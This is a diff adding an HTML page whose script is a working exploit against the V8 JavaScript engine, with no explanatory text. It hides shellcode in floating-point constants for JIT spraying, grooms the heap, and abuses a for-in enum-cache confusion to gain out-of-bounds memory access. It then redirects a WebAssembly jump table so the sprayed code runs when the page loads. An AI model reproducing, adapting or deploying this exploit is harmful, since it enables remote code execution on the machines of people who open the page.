@@ -1,0 +1,232 @@
+<html>
+<script>
+    function evil_func(){
+        return [1.9710306750499828e-246,1.9711828988933693e-246,1.971182899732498e-246,1.971030675050178e-246,1.9710255989868054e-246,1.9711824228871598e-246,1.9711456320011223e-246,1.97118289986328e-246,1.971183248285433e-246,1.957337479117553e-246,1.9711829006817306e-246,1.9954775611974522e-246,1.9308005958458415e-246,1.9711823030698762e-246,1.9308005733683694e-246,1.9710303688744982e-246,5.509415213541939e-232,5.548387896473483e-232,5.506270121275645e-232,5.5479425926213244e-232,5.6167700004814004e-232,5.547942592563654e-232,5.4471230781386954e-232,5.435485619509096e-232,5.5483866055874626e-232,5.503126311696791e-232,5.498607087543086e-232,5.4986070894177074e-232,5.548386609604868e-232,5.5999879849132164e-232,5.5479425925740885e-232,5.5483866079403686e-232,1.99633370890667e+161,1.524388661345774e-307,];
+    }
+
+    for(let i=0; i<0x40000; i++){
+        evil_func();evil_func();evil_func();
+    }
+    evil_func();
+    // string data area: +0xc
+    // map-properties-elements-length
+    var fake_obj_str = "\x35\x04\x19\x00\x19\x02\x00\x00\xb1\x75\x24\x00\x00\x10\x00\x00";
+    let func_addr = 0x2475b1n;
+
+    let wasm_code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x60, 0x01, 0x7f, 0x00, 0x60, 0x00, 0x00, 0x02, 0x19, 0x01, 0x07, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0x0d, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x00, 0x03, 0x02, 0x01, 0x01, 0x07, 0x11, 0x01, 0x0d, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x01, 0x0a, 0x08, 0x01, 0x06, 0x00, 0x41, 0x2a, 0x10, 0x00, 0x0b]);
+    let wasm_module = new WebAssembly.Module(wasm_code);
+    let importObject = {
+        imports: {
+            imported_func: () => {
+                console.log("[*] it's tt");
+            }
+        }
+    }
+
+    let wasm_instance = new WebAssembly.Instance(wasm_module, importObject);
+
+    const buf = new ArrayBuffer(8);
+    const f64 = new Float64Array(buf);
+    const u32 = new Uint32Array(buf);
+    const bigUint64 = new BigUint64Array(buf);
+
+    f2i = (val) => {
+        f64[0] = val;
+        return bigUint64[0];
+    }
+    i2f = (val) => {
+        bigUint64[0] = val;
+        return f64[0];
+    }
+    high = (i) => {
+        return (i>>32n) & 0xffffffffn;
+    }
+    low = (i) => {
+        return i & 0xffffffffn;
+    }
+    combine = (L, H) => {
+        return L + (H << 32n);
+    }
+    hex = (i) =>{
+        return i.toString(16).padStart(16, "0");
+    }
+
+    CreateObject = (prop_cnt, prop) => {
+        let obj = {};
+        for(let i=0; i<prop_cnt; i++){
+            obj[`p${i}`] = prop[i];
+        }
+        return obj;
+    }
+
+    InitEnumCache = (obj) => {
+        for(k in obj) {}
+    }
+    
+    gc = () => {
+        for(let i=0; i<0x100000; i++){
+            new String;
+        }
+    }
+
+    gc();gc();
+
+    const obj1 = CreateObject(1, [99]);
+    const obj2 = CreateObject(9, [233,2,3,4,5,6,7,8,9]);
+    let spray_heap = [
+        5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308,5.654053543387954e-308];
+
+    // %DebugPrint(obj2);
+    // %DebugPrint(spray_heap);
+    const obj3 = CreateObject(10, [31,32,33,34,35,36,37,38,39,30]);
+
+    InitEnumCache(obj2);
+
+    let gg = 1337;
+
+    let ss = null;
+    function trigger(callback) {
+        for (let key in obj2) {
+            if(key == "p1"){
+                callback();
+                // return obj2[key];
+                gg = obj2[key];
+                
+            }
+            ss = String.fromCharCode.apply(null, [0xa0, 0x5, 0, 0]);
+        }
+    }
+
+    // JIT
+    for(let i=0; i<0x40000; i++){
+        trigger(_ => _);
+    }
+
+    trigger(_ => _);
+
+    for(let i=0; i<0x40000; i++){
+        trigger(_ => _);
+    }
+
+    let  domparser = new DOMParser();
+    domparser = new DOMParser();
+    domparser = new DOMParser();
+    domparser = new DOMParser();
+    domparser = new DOMParser();
+    domparser = new DOMParser();
+    // %DebugPrint(evil_func);
+    // %DebugPrint(wasm_instance);
+    // %DebugPrint(fake_obj_str);
+    
+    // exploit 
+    trigger(_ => {
+        obj3.p9 = 2.44; // deprecated
+        InitEnumCache(obj1); 
+        console.log("trigger new enumcache");
+
+    });
+
+    let func_idx = 0;
+    let instance_idx = 0;
+    let func_low_high = 0;
+    let instance_low_high = 0;
+
+    // console.log(gg);
+
+    for(let i=0; i<600; i++){
+        // console.log(i, hex(f2i(gg[i])));
+        if(func_idx == 0){
+            if((f2i(gg[i]) & 0xffffffn) == 0x1845ad){
+                console.log("find func idx: ", i, hex(f2i(gg[i])));
+                func_low_high = 1;
+                func_idx = i;
+            }
+              if(((f2i(gg[i])>>32n) & 0xffffffn) == 0x1845ad){
+                console.log("find func idx: ", i, hex(f2i(gg[i])));
+                func_low_high = 2;
+                func_idx = i;
+            }
+        }
+        if((f2i(gg[i]) & 0xffffffn) == 0x1ab801 || (f2i(gg[i]) & 0xffffffn) == 0x1ab865){
+            console.log("find instance idx: ", i, hex(f2i(gg[i])));
+            instance_low_high = 1; // map in low
+            instance_idx = i;
+            break;
+        }
+        if(((f2i(gg[i])>>32n) & 0xffffffn) == 0x1ab801 || ((f2i(gg[i])>>32n) & 0xffffffn) == 0x1ab865){
+            console.log("find instance idx: ", i, hex(f2i(gg[i])));
+            instance_idx = i;
+            instance_low_high = 2; // map in high
+            break;
+        }
+    }
+
+    console.log("func low or high: ", func_low_high, func_low_high == 1?"low":"high");
+    console.log("instance low or high: ", instance_low_high, instance_low_high == 1?"low":"high");
+
+    let wasm_instance_elem = f2i(gg[instance_idx+1]);
+    console.log("instance elem: ", hex(wasm_instance_elem));
+
+    let code_weak_arr = 0n;
+    if(func_low_high == 1){
+        code_weak_arr = low(f2i(gg[func_idx+6]));
+    }
+    if(func_low_high == 2){
+        code_weak_arr = high(f2i(gg[func_idx+6]));
+    }
+    
+    // console.log("code weak arr: ", hex(code_weak_arr));
+    let a = hex(code_weak_arr);
+
+    gg[func_idx+6] = i2f(combine(0x89n, 0x22n));
+    gg[func_idx+7] = i2f(func_addr + BigInt(func_idx+9)*8n);
+    gg[func_idx+8] = i2f(combine(0x190435n, 0x219n));
+    gg[func_idx+9] = i2f(combine(code_weak_arr, 0x20n));
+
+    let code_base = 0;
+    for(let j=0; j<5; j++){
+        // console.log(hex(f2i(gg[instance_idx+10+j])));
+    }
+    if(instance_low_high == 1){
+        let high_tmp = high(f2i(gg[instance_idx+1]));
+        gg[instance_idx+1] = i2f(combine(func_addr + BigInt(func_idx+7)*8n, high_tmp));
+        code_base = high(f2i(gg[instance_idx+11]));
+    }
+    if(instance_low_high == 2){
+        gg[instance_idx+1] = i2f(combine(0x219n, func_addr+BigInt(func_idx+7)*8n));
+        code_base = low(f2i(gg[instance_idx+12]));
+    }
+    console.log("code base: ", hex(code_base));
+
+    let code_arr_addr = wasm_instance[0][0];
+    let maglev_addr = high(f2i(code_arr_addr))-2n;
+    console.log("maglev addr: ", hex(maglev_addr));
+    
+    gg[func_idx+9] = i2f(combine(maglev_addr, 0x20n));
+    let maglev_offset = high(f2i(wasm_instance[0][0]));
+    console.log("magleve offset: ", hex(maglev_offset));
+
+    let jmp_table = f2i(gg[instance_idx+10]);
+    // let bbbase = 0x5555n;
+    let bbbase = 0x5500n + BigInt(Math.floor(Math.random()*0xff) + 0x0);
+    // console.log(hex(bbbase));
+    let jit_spray_offset = 0xb9n;
+
+    console.log("jmp table: ", hex(jmp_table));
+    console.log("jmp table: ", hex(f2i(gg[instance_idx+11])));
+    console.log("hjack addr:", hex(combine(maglev_offset+jit_spray_offset, bbbase)));
+
+    if(instance_low_high == 2){
+        let ttmp1 = high(f2i(gg[instance_idx+11]));
+        gg[instance_idx+10] = i2f(combine(0xffffffffn, maglev_offset+jit_spray_offset));
+        gg[instance_idx+11] = i2f(combine(bbbase, ttmp1));
+    }
+    if(instance_low_high == 1){
+        gg[instance_idx+10] = i2f(combine(maglev_offset+jit_spray_offset, bbbase));
+    }
+
+    wasm_instance.exports.exported_func();
+    evil_func();
+</script>
+
+</html>
